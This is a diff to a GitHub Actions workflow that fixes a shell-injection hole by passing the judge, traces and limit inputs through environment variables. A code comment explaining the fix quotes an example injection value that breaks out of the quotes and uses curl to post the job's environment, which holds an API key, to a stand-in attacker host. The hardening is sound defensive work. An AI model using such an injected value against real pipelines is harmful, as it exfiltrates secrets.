@@ -42,12 +42,20 @@ jobs:
       - name: Install dependencies
         run: npm ci
 
+      # Workflow inputs are passed through env, never interpolated into the
+      # shell. GitHub expands ${{ }} textually BEFORE bash sees the script, so
+      # a value like  x"; curl -d @<(env) https://attacker/ #  would break out
+      # of the quotes and run — in a job whose env holds OPENROUTER_API_KEY.
       - name: Run judge (score-only)
+        env:
+          JUDGE: ${{ inputs.judge }}
+          TRACES: ${{ inputs.traces }}
+          LIMIT: ${{ inputs.limit }}
         run: |
           npm run eval:judge:score -- \
-            --judge "${{ inputs.judge }}" \
-            --traces "${{ inputs.traces }}" \
-            --limit "${{ inputs.limit }}" \
+            --judge "$JUDGE" \
+            --traces "$TRACES" \
+            --limit "$LIMIT" \
             --out eval-live/report.md \
             --verdicts eval-live/verdicts.jsonl
 
